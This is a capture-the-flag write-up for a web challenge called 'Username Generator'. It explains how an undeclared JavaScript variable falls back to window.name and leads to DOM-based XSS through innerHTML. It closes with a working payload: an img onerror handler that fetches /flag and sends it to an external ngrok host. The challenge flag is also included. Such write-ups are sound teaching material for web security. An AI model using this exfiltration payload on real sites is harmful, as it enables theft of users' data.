# Username Generator - Solution

**Author**: zeyu2001

**Category**: Web

The vulnerability comes from the use of `name` below.

```javascript
const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);
const usernameLength = parameters.get('length');

// Generate a random username and display it
if (usernameLength === null) {
    var name = "loading...";
    window.location.href = "/?length=10";
}
else if (usernameLength.length > 0) {
    var name = generate(+usernameLength);
}
document.getElementById('generatedUsername').innerHTML = `Your generated username is: ${name}`;
```

The logic of this script is a bit suspicious. Consider the case where the `length` query parameter exists but is a string of length 0 - the `name` variable is never declared, yet it is used.

Since in HTML, the global scope is the window object (see [global scope](https://www.w3schools.com/js/js_scope.asp)), `name` would then refer to `window.name`, which can be set when we open a new window programatically.

To solve this challenge, all we need to do is to ensure that the `name` variable is never redeclared, which happens when we use `?length=` as the query string so that `usernameLength === ''`. We can then control `window.name` when using `window.open()` on our exploit server, and cause an XSS due to the insecure usage of `innerHTML`.

```html
<script>
    window.open(
        'http://app:80?length=', 
        '<img src=x onerror=\'fetch("/flag").then(response => response.text()).then(flag => { fetch("https://678e-115-66-128-224.ngrok.io?" + flag); });\'/>')
</script>
```

Flag: `SEE{x55_15_my_m1ddl3_n4m3_00d21e74f830352781874d57dff7e384}`